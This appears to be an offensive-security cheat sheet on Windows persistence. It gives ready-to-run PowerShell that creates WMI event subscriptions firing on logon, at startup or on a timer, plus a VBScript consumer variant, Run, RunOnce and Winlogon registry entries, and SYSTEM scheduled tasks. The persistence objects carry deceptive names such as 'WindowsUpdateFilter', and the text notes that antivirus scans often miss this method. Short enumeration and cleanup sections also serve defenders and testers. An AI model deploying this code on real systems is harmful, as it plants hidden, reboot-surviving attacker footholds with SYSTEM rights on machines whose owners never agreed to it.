# WMI Event Subscription Persistence

WMI event subscriptions are one of the stealthiest persistence mechanisms. They live entirely in the WMI repository (no file on disk), survive reboots, and the trigger runs as SYSTEM. Commonly missed by AV/EDR during file-based scans.

**Three components required:**
1. **EventFilter** — the condition (e.g., "when user logs on")
2. **EventConsumer** — what to do (run a command)
3. **FilterToConsumerBinding** — ties the two together

---

## PowerShell — User Logon Trigger

```powershell
# Create persistence that fires on any user logon:
$FilterArgs = @{
    Name = "WindowsUpdateFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2"
}

$ConsumerArgs = @{
    Name = "WindowsUpdateConsumer"
    CommandLineTemplate = "powershell.exe -w hidden -enc PAYLOAD_BASE64"
}

# Create the three components:
$Filter = Set-WMIInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs
$Consumer = Set-WMIInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs
Set-WMIInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$Filter; Consumer=$Consumer}

Write-Host "[+] WMI persistence created — triggers on user logon"
```

---

## PowerShell — System Startup Trigger

```powershell
# Fires within 60 seconds of boot:
$FilterArgs = @{
    Name = "StartupFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"
}

$ConsumerArgs = @{
    Name = "StartupConsumer"
    CommandLineTemplate = "C:\Windows\Temp\loader.exe"
}

$Filter = Set-WMIInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs
$Consumer = Set-WMIInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs
Set-WMIInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$Filter; Consumer=$Consumer}
```

---

## PowerShell — Time-Based Trigger (Every 4 Hours)

```powershell
# Fire every 4 hours (interval in seconds: 14400):
$FilterArgs = @{
    Name = "IntervalFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __TimerEvent WHERE TimerID='IntervalTimer'"
}

# Create the timer:
Set-WMIInstance -Class __IntervalTimerInstruction -Namespace "root\subscription" -Arguments @{
    TimerID = "IntervalTimer"
    IntervalBetweenEvents = 14400000  # milliseconds (4 hours)
}

$ConsumerArgs = @{
    Name = "IntervalConsumer"
    CommandLineTemplate = "powershell.exe -w hidden -enc PAYLOAD"
}

$Filter = Set-WMIInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs
$Consumer = Set-WMIInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs
Set-WMIInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$Filter; Consumer=$Consumer}
```

---

## Verify / Enumerate WMI Subscriptions

```powershell
# List all EventFilters:
Get-WMIObject -Namespace root\subscription -Class __EventFilter

# List all EventConsumers:
Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer

# List all Bindings:
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding

# Audit all three in one command:
Get-WMIObject -Namespace root\subscription -Class __EventFilter | Select Name, Query
Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer | Select Name, CommandLineTemplate
```

---

## Cleanup — Remove WMI Persistence

```powershell
# Remove by name:
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -match "WindowsUpdate"} | Remove-WMIObject
Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateConsumer'" | Remove-WMIObject
Get-WMIObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WindowsUpdateFilter'" | Remove-WMIObject
```

---

## Alternative: Script Event Consumer (LOLBin)

```powershell
# Instead of CommandLineEventConsumer, use ActiveScriptEventConsumer (VBScript or JScript):
$ConsumerArgs = @{
    Name = "ScriptConsumer"
    ScriptingEngine = "VBScript"
    ScriptText = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -w hidden -enc PAYLOAD", 0, False
"@
}
$Consumer = Set-WMIInstance -Class ActiveScriptEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs
```

---

## Registry-Based Persistence (Simpler Backup)

```cmd
# Run key (fires for every user logon):
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\loader.exe" /f

# HKLM Run (requires admin — fires for any user):
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\loader.exe" /f

# RunOnce (fires once, then deletes itself):
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Update" /t REG_SZ /d "C:\Windows\Temp\loader.exe" /f

# Logon Script (all users — less common, more OPSEC risk):
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\System32\userinit.exe,C:\Windows\Temp\loader.exe" /f
```

---

## Scheduled Task Persistence

```cmd
# Create a scheduled task that runs on logon as SYSTEM:
schtasks /Create /SC ONLOGON /TN "WindowsDefenderUpdate" /TR "C:\Windows\Temp\loader.exe" /RU "SYSTEM" /F

# Run daily at 9am:
schtasks /Create /SC DAILY /ST 09:00 /TN "SecurityScan" /TR "C:\Windows\Temp\loader.exe" /RU "SYSTEM" /F

# Every 4 hours:
schtasks /Create /SC HOURLY /MO 4 /TN "TelemetryService" /TR "C:\Windows\Temp\loader.exe" /RU "SYSTEM" /F

# Delete after running:
schtasks /Delete /TN "WindowsDefenderUpdate" /F

# List all tasks:
schtasks /Query /FO LIST /V | findstr "Task Name\|Status\|Run As"
```
